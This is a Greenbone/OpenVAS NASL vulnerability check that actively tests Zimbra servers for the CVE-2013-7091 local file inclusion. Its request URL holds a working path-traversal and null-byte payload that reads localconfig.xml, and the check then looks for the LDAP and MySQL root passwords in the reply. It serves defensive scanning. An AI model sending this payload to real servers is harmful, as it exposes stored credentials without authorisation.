# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zimbra:collaboration";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103853");
  script_version("2022-08-18T10:11:39+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-08-18 10:11:39 +0000 (Thu, 18 Aug 2022)");
  script_tag(name:"creation_date", value:"2013-12-11 13:52:09 +0100 (Wed, 11 Dec 2013)");

  script_cve_id("CVE-2013-7091");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Zimbra < 7.0.0 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_zimbra_consolidation.nasl");
  script_mandatory_keys("zimbra/admin_or_client/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Zimbra is prone to a local file include (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to read localconfig.xml.");

  script_tag(name:"insight", value:"A local file inclusion in /res/I18nMsg, AjxMsg, ZMsg, ZmMsg,
  AjxKeys, ZmKeys, ZdMsg and Ajx%20TemplateMsg.js.zgz allows to read any local file.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts. This could allow the attacker to
  compromise the application and the computer.");

  script_tag(name:"affected", value:"Zimbra version 2009, 2010, 2011, 2012 and 2013.");

  script_tag(name:"solution", value:"Update to version 7.0.0 or later.");

  script_xref(name:"URL", value:"http://files.zimbra.com/website/docs/7.0/Zimbra%20OS%20Release%20Notes%207.1.4-2.pdf");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64149");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/linux/zimbra-0day-exploit-privilegie-escalation-via-lfi");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00";

req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req );

if( "zimbra_ldap_password" >< buf && "mysql_root_password" >< buf ) {
  report = http_report_vuln_url( url:url, port:port );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
